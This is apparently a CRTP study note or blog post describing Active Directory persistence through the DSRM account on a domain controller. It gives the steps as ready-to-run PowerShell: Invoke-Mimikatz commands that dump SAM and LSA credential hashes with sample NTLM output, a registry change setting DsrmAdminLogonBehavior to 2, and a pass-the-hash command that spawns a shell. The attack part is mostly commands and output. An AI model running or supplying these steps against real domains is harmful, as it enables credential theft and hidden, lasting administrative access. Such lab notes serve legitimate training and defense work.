---
title: "Persistence With DSRM And Mimikatz"
tags: [
	hacking,
	crtp,
	persistence,
  powershell
]
---
We have domain admin, lets really sink our hook in and ensure persistence.

It's pretty easy with ['Invoke-Mimikatz.ps1'](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)

## What is DSRM?
Directory Services Restore Mode (aka DSRM), is a safe mode boot option for Windows Server domain controllers.  This is a backdoor to the database for administrators to used to repair, recover, and restore an Active Directory database.

## Exploit
There is a local administrator on every DC called "Administrator" whose password is the DSRM password.  

DSRM password (SafeModePassword) is required when a server is  
promoted to Domain Controller and it is rarely changed.  

After altering the configuration on the DC, it is possible to pass the  
NTLM hash of this user to access the DC.

```PowerShell
# Dump DSRM password (needs DA privs)  
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc

RID  : 000001f4 (500)
User : Administrator
NTLM : a102ad5753f4c441e3af31c97fad86fd
```

```PowerShell
# Compare the Administrator hash with the Administrator hash of below command  
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc

RID  : 000001f4 (500)
User : Administrator
NTLM : af0686cc0ca8f04df42210c9ac980760
```

#### Change logon behavior
The Logon Behavior for the DSRM account needs to be changed  
before we can use its hash.

```PowerShell
Enter-PSSession -Computername dcorp-dc  
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

#### Pass the hash
```PowerShell
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
```
